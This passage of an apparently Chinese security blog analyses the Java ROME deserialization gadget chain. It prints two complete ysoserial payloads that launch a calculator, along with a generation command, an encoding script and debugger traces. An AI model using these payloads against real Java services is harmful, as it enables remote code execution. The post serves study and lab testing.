<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">EXP=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB%<span class="number">2</span>BAAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA<span class="comment">/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8%2BAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ%2BAQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMjEzOTMzNjQzODY5MzA0AQAgTHlzb3NlcmlhbC9Qd25lcjIxMzkzMzY0Mzg2OTMwNDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA%2BnAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB%2BABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu%2BX2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB%2BAAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB%2BAB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB%2BACNxAH4ADXEAfgAGcQB%2BAAZxAH4ABng%3D</span></span><br></pre></td></tr></table></figure></div>

<p>base64 编码可以直接用 kali 自带的：<code>java -jar ./ysoserial-all.jar ROME &#39;calc.exe | base64 &gt; payload.txt</code> ，再丢进 cyberchef 中 URL 编码即可。或者将得到的字节数据重定向到文件中，用以下脚本进行编码处理：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">filename = <span class="string">&quot;./res.bin&quot;</span></span><br><span class="line">s = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">base64_str = base64.b64encode(s)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;base64.txt&quot;</span>, <span class="string">&quot;wt&quot;</span>, encoding = <span class="string">&quot;utf-8&quot;</span>).write(parse.quote(base64_str.decode()))</span><br><span class="line"><span class="comment"># open(&quot;base64.txt&quot;, &quot;wt&quot;, encoding = &quot;utf-8&quot;).write(base64_str.decode())</span></span><br></pre></td></tr></table></figure></div>

<p>base64 库有另一个 b64 编码方法：<code>urlsafe_b64encode()</code> ，该方法生成的 payload 传入后会导致 JAVA 报错 base64 编码内容 </p>
<hr>
<p> 在 powershell 下用 ysoserial 生成 payload 会有问题，原因是 powershell 不支持字节流重定向，ysoserial 输出的内容被重定向时会被当作字符串处理，经过解码、编码后数据会有损失（pwoershell 默认是 ANSI 编码，但不论什么编码都会导致数据的损失）。也正是其输出的内容无法被当作字符串处理的原因，直接复制粘贴工具在终端输出的内容或者将输出内容重定向至文件再复制粘贴都无法得到完整有效的 payload。具体表现为如果是真正有效的 payload，复制粘贴时只会复制前面一小部分；而能完整复制下来的 payload 字节内容都是有误的。</p>
<p>Bash 可以重定向字节流，甚至可以用 base64 直接对输出的字节数据编码，因此在 linux 下用该工具基本能得到正确内容。</p>
<p>Kali 下运行获得的正确的 payload 字节流数据头：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/Snipaste_2023-10-31_10-43-31.png"
                     
                ></p>
<p>使用 powershell 重定向至文件后获得的错误的字节流数据头：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/image-20231031104900799.png"
                      alt="image-20231031104900799"
                ></p>
<p>上述错误的字节流数据传入 JAVA 的反序列化函数会报错：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">java.io.StreamCorruptedException: invalid stream header: EE848800</span><br></pre></td></tr></table></figure></div>

<hr>
<p>ROME 链条解析：在 <code>ysoserial/src/main/java/ysoserial/payloads/ROME</code> 的源码中可以看到 ROME 的利用链条：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">* NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* Method.invoke(Object, Object...)</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure></div>

<h4 id="利用链调试"><a href="#利用链调试" class="headerlink" title="利用链调试"></a>利用链调试</h4><p><em>参考：<a class="link"   href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" >ROME 反序列化漏洞分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p>
<p>在本地搭建 ROME 测试环境，IDEA 新建一个 Maven 项目，archType 勾选 WebApp，在 pom.xml 中引入 ROME 依赖：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>新建测试类：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myremo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoEntry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64_exp</span> <span class="operator">=</span> <span class="string">&quot;Base64_String&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] exp = Base64.getDecoder().decode(base64_exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Base64_String</code> 替换为以下测试 payload：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA<span class="comment">/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAbAyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB95c29zZXJpYWwvUHduZXI3NDM4Nzc3OTA0NjI5MDc5AQAhTHlzb3NlcmlhbC9Qd25lcjc0Mzg3Nzc5MDQ2MjkwNzk7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALgAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAMwAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAANwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAXAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADsADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhzcgAoY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuRXF1YWxzQmVhbvWKGLvl9hgRAgACTAAKX2JlYW5DbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAEX29ianEAfgAJeHB2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwcQB+ABRzcgAqY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuVG9TdHJpbmdCZWFuCfWOSg8j7jECAAJMAApfYmVhbkNsYXNzcQB+ABxMAARfb2JqcQB+AAl4cHEAfgAfcQB+ABRzcQB+ABt2cQB+AAJxAH4ADXNxAH4AIHEAfgAjcQB+AA1xAH4ABnEAfgAGcQB+AAZ4</span></span><br></pre></td></tr></table></figure></div>

<p>如果用的 IDEA，在 External Libraries 中的 <code>rome-1.0.jar/com.sun.syndication/feed/impl/ObjectBean</code> 类的 <code>hashcode()</code> 函数中下断点，回到主函数启动调试即可来到反序列化的入口点，到达最终利用点时的函数栈情况如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">getTransletInstance:<span class="number">452</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">485</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">506</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)	<span class="comment">// A2</span></span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">120</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)	<span class="comment">// A1</span></span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">340</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">1419</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1185</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2345</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2236</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1692</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">508</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">466</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">14</span>, RemoEntry (myremo)</span><br></pre></td></tr></table></figure></div>

<p>最终利用的点是：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">       <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();	<span class="comment">// A3</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">           <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">           <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                   _class[_transletIndex].getConstructor().newInstance();	<span class="comment">// A5</span></span><br><span class="line">           translet.postInitialization();</span><br><span class="line">           translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">           translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">           translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">           <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">               translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> translet;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">               NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">           <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString(), e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>A3 处当条件为 True 时会进入 <code>defineTransletClasses()</code> 函数：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            